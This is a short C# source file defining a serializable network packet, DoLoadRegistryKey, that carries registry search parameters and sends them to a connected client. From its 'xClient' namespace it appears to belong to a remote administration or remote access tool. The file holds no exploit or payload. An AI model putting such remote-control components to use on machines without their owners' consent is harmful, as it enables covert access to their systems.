﻿using System;
using Microsoft.Win32;
using xClient.Core.Networking;
using xClient.Core.Registry;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoLoadRegistryKey : IPacket
    {
        public RegistrySeekerParams SearchParameters { get; set; }

        public DoLoadRegistryKey(RegistrySeekerParams args)
        {
            SearchParameters = args;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}